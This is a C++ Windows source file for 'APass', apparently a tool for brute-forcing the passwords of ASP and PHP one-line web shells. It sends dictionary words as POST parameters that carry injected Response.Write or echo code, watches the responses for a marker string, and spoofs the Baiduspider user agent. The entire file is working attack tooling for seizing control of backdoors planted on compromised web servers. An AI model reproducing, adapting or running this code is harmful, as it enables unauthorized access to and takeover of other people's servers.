//	APass.cpp
//	2013-3-16
//	2013-3-24
//	2013-04-03
//	2013-04-18
//	2013-05-06
//	2013-06-21
#include <winsock2.h>
#include <stdio.h>
#include <wininet.h>
#include <Windows.h>
#include <process.h>
#pragma comment(lib,"wininet.lib")
#pragma comment(lib,"ws2_32.lib")

#define max404 8192			// 定义页面信息的最大接收长度
#define http_header "Content-Type: application/x-www-form-urlencoded\r\n"
#define method "POST"
#define ASP1 "%s=Response.Write(\"_iW_v_1_I_0s_U\")&"
#define ASP2 "%s=Response.Write(\"_iW_v_1_I_1s_U\")"
#define PHP1 "%s=echo _iW_v_1_I_0s_U;&"
#define PHP2 "%s=echo _iW_v_1_I_1s_U;"
#define TIMEOUT 4096
#define SLEEP_TIME 2
#define USER_AGENT "Baiduspider"	// 寂寞党在此修改User-Agent


char WEBSITE[64];		// 网址: www.ayiis.me
char *WEBPATH;			// 路径: /s.asp
int PORT = 80;			// 端口: 8088

FILE *ffs;				// 字典文件
long fileline=0 ;		// 读取的行数，Socket错误次数，成功探测到的路径数

bool ASP = true , GII = false, GIII = false ;	// asp/php ，第一轮OK ，第二轮OK
bool EXIT_FLAG = false, FILEND = false ;		// 退出标志（按下了CTRL+C），文件是否已经读取完毕 

char tttt[64][32] ;		// 第一轮成功，保存数据的缓存区
CRITICAL_SECTION beswap ;	// 临界区声明
HINTERNET hConn ;

typedef struct{
	char req[32];
}Host;

// 退出事件的监听函数
//
BOOL WINAPI ConsoleHandler(DWORD msgType)
{
	if (msgType == CTRL_C_EVENT){
		EXIT_FLAG=true;
		return TRUE;
	}
	else if (msgType == CTRL_CLOSE_EVENT){
		EXIT_FLAG=true;
		return TRUE;
	}
	return FALSE;
}

// 线程函数
//
unsigned _stdcall Scan2(void*){
	char szBuffer[max404]="";
	char tmp[max404],fin[32],ttt[64][32];
	char *METHOD = ASP ? ASP1 : PHP1 ;

	while( EXIT_FLAG==false && FILEND==false ){

		//------------------------------进入第一临界区--------------------------------
		//
		szBuffer[0]='\0';
		ULONG dwByteRead = 0;

		EnterCriticalSection(&beswap);
		if( FILEND==true )
			break;

		for(int ti=0 ; ti<64 && FILEND==false; ti++ ){
			if( fgets(fin,32,ffs) ){
				fin[strlen(fin)-1]='\0';	// 去除行尾的换行符
				strcpy(ttt[ti],fin);
				++fileline;
				sprintf(tmp,METHOD,fin);	// pass1=Response.Write(7)&pass2=Response.Write(7)&...
				strcat(szBuffer,tmp);
			}
			else
				FILEND = true;
		}

		LeaveCriticalSection(&beswap);
		//
		//------------------------------退出第一临界区--------------------------------

		HINTERNET hPOSTs = HttpOpenRequest(hConn, method, WEBPATH, NULL, WEBSITE, (LPCSTR *)"*/*", 0, 1);
		HttpSendRequest(hPOSTs, http_header, 49, szBuffer, lstrlen(szBuffer));

		InternetReadFile(hPOSTs, szBuffer, max404, &dwByteRead);	// 长度将返回到 dwByteRead

		if( dwByteRead > 0 ){
			szBuffer[dwByteRead]='\0';
			if(strstr(szBuffer,"_iW_v_1_I_0s_U")){
				EnterCriticalSection(&beswap);
				if( GII==false ){		// 第一次进来
					GII = true;
					for(int ic=0;ic<64;ic++)
						strcpy(tttt[ic],ttt[ic]==NULL?"":ttt[ic]);
				}
				LeaveCriticalSection(&beswap);
			}
		}
		InternetCloseHandle(hPOSTs);
	}
	return 0;
}

// 第二轮的线程函数
//
unsigned _stdcall Scan3(void* lp){
	Host *lpHost = (Host*)lp;
	char szBuffer[max404];
	char *METHOD = ASP ? ASP2 : PHP2 ;
	ULONG dwByteRead = 0;

	sprintf(szBuffer,METHOD,lpHost->req);

	HINTERNET hPOSTs = HttpOpenRequestA(hConn, method, WEBPATH, NULL, WEBSITE, (LPCSTR *)"*/*", 0, 1);
	HttpSendRequestA(hPOSTs, http_header, 49, szBuffer, lstrlen(szBuffer));

	InternetReadFile(hPOSTs, szBuffer, max404, &dwByteRead);

	if( dwByteRead > 0 ){
		szBuffer[dwByteRead]='\0';
		if(strstr(szBuffer,"_iW_v_1_I_1s_U")){
			EnterCriticalSection(&beswap);
			if( GIII == false ){
				GIII = true ;
				printf("%cDetected Password:%s\n",13,lpHost->req);
			}
			LeaveCriticalSection(&beswap);
		}
	}
	InternetCloseHandle(hPOSTs);
	return 0;
}

int main(int argc,char *argv[]){
	// 监听[CTRL+C]等事件
	SetConsoleCtrlHandler( (PHANDLER_ROUTINE) ConsoleHandler, TRUE);

	if(argc != 4 && argc != 5){
		printf("\nApass v1.36 \n\n\t%s +[TYPE] +[URL+Port+Path] +[Dic.txt] -[Threads]",argv[0]);
		printf("\n\t%s asp http://www.ayiis.me:8088/s.asp dic.txt 64",argv[0]);
		printf("\n\t%s php http://www.ayiis.me:8088/s.php dic.txt 64\n",argv[0]);
		return -1;
	}

	if((ffs=fopen(argv[3],"r"))==NULL){
		printf("Dic file open error");
		return -1;
	}

	if(strcmp(argv[1],"php")==0){
		printf("php\t");
		ASP = false;
	}
	else
		printf("asp/aspx\t");

	int Max_THREAD = 16;
	if( 5<=argc ){
		if( atoi(argv[4]) > 0 )
			Max_THREAD = atoi(argv[4]);
		else
			printf("**Warning: Got an illegal input in Threads Parameter.\n\t   Reset Threads to 16.\n");
	}

	char *p1 = strstr(argv[2],"//")+2;		//  www.ayiis.me:8088/s.asp 
	WEBPATH = strstr(p1,"/");				//	/s.asp
	strncpy(WEBSITE,p1,WEBPATH-p1);
	WEBSITE[WEBPATH-p1]='\0';				//	www.ayiis.me:8088
	if(strstr(WEBSITE,":")){
		p1 = strstr(WEBSITE,":")+1;
		WEBSITE[p1-WEBSITE-1]='\0';			//	www.ayiis.me
		PORT=atoi(p1);						//	8088
	}

	HINTERNET hInet = InternetOpenA(USER_AGENT, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
	hConn = InternetConnectA(hInet, WEBSITE, PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

	HANDLE *hThreads = new HANDLE[Max_THREAD];
	HANDLE *hThreads2 = new HANDLE[64];
	// 根据最大线程数创建线程
	ZeroMemory(hThreads,sizeof(HANDLE)*Max_THREAD);
	ZeroMemory(hThreads2,sizeof(HANDLE)*64);

	//------------------------------------------------------------------------

	InitializeCriticalSection(&beswap);

	SYSTEMTIME sys;
	GetLocalTime( &sys );
	double start=((sys.wHour*60+sys.wMinute)*60+sys.wSecond)*1000+sys.wMilliseconds;
	long iThreadCount = 0, iThreadCount2 = 0 ;	// 创建的线程数目计数

	printf("\n\n-------------Trying-----------\n\n");

	// 申请挂起的线程,数量为Max_THREAD
	for( iThreadCount = 0; iThreadCount < Max_THREAD ; iThreadCount++){
		HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, Scan2, NULL, CREATE_SUSPENDED, NULL);
		if(hThread==NULL){
			printf("***Create thread fail!!\n");
			EXIT_FLAG =true;
			break;
		}
		hThreads[iThreadCount] = hThread;		// 统计线程数
		ResumeThread( hThread );				// 恢复挂起的线程
		Sleep(SLEEP_TIME);
	}

	while( EXIT_FLAG==false && FILEND==false && GII==false ){	Sleep(500);putchar(46);}	// 进入循环等待，直到手动停止[CTRL+C]或者字典读完

	if(GII){
		Host** ps = new Host*[64];
		ZeroMemory(ps,sizeof(Host*)*64);

		for(iThreadCount2 = 0 ; iThreadCount2 < 64 && tttt[iThreadCount2]!=NULL ; iThreadCount2++){		// 最大是64
			ps[iThreadCount2] = new Host;
			strcpy(ps[iThreadCount2]->req, tttt[iThreadCount2]);	// 将pass1 pass2 pass3...单独提取出来
			HANDLE hThread = (HANDLE)_beginthreadex(NULL, 0, Scan3, ps[iThreadCount2], CREATE_SUSPENDED, NULL);
			if(hThread==NULL){
				printf("bad thread");
				continue;
			}
			Sleep(SLEEP_TIME);
			hThreads2[iThreadCount2] = hThread;
			ResumeThread(hThread);
		}
	}

	for(int iGroup = 0 ; 0<iThreadCount ; iGroup ++, iThreadCount -= MAXIMUM_WAIT_OBJECTS )	// 循环等待所有线程退出
	{
		WaitForMultipleObjects(
			iThreadCount>MAXIMUM_WAIT_OBJECTS ? MAXIMUM_WAIT_OBJECTS : iThreadCount,
			hThreads+iGroup*MAXIMUM_WAIT_OBJECTS,
			FALSE,				// FALSE will be faster, but TRUE is safer
			GII?100:TIMEOUT);	// IF got the first sleep shorter
	}

	if(GII){
		for(int iGroup = 0 ; 0<iThreadCount2 ; iGroup ++, iThreadCount2 -= MAXIMUM_WAIT_OBJECTS )	// 循环等待所有线程退出
		{
			WaitForMultipleObjects(
				iThreadCount2>MAXIMUM_WAIT_OBJECTS ? MAXIMUM_WAIT_OBJECTS : iThreadCount2,
				hThreads2,
				FALSE,			// FALSE will be faster, but TRUE is safer
				GIII?100:TIMEOUT+TIMEOUT);		// wait until end up
		}
	}

	fclose(ffs);
	delete[Max_THREAD] hThreads;	// 清理
	delete[64] hThreads2;

	DeleteCriticalSection(&beswap);

	//------------------------------------------------------------------------

	if( GII == true && GIII == false )	// Goit = 1 表示第一步成功，正在进行第二步，Goit大于1表示已经完成。
		printf("\nSucceed in first step,but somehow failed in second step.Maybe you should try me again?");

	InternetCloseHandle(hConn);
	InternetCloseHandle(hInet);
	WSACleanup();

	GetLocalTime( &sys );
	double duration = (((sys.wHour*60+sys.wMinute)*60+sys.wSecond)*1000+sys.wMilliseconds - start)/1000;

	printf("\n-------------Done!------------\n");
	printf("\nTarget: %s",argv[2]);
	printf("\n\tRequset = %d, Time = %.3fs, Speed = %.1f L/s\n",fileline,duration,(double)fileline/duration);
	exit(0);
}
